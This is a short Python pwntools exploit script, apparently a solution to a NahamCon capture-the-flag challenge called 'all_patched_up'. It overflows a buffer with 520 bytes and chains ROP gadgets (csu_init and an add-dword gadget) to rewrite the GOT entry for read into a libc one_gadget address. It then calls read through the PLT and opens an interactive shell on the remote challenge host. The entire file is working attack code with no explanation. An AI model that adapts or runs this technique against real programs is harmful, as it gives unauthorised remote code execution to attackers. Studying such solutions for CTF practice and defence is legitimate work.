from pwn import *

context.binary = exe = ELF('./all_patched_up')
libc = ELF('./libc.so.6')

# Gadgets
offset = b'i'*520
one = 0xe3afe # r12, r15 == NULL
one_offset = one - libc.sym['read']
one_offset = one_offset & 0xffffffffffffffff
add_gadget = 0x000000000040115c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
pop_rsi_r15 = 0x0000000000401251 # pop rsi; pop r15; mov rdi, 1; ret;
csu_init = 0x40124a # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; mov rdi, 1; ret;


#io = process()
#gdb.attach(io, api=True)
io = remote('challenge.nahamcon.com', 32244)

io.recvuntil(b'> ')
payload = offset
payload += p64(csu_init)
payload += p64(one_offset)
payload += p64(exe.got['read'] + 0x3d) + p64(0)*4
payload += p64(add_gadget)
payload += p64(exe.plt['read'])

io.send(payload)
io.interactive()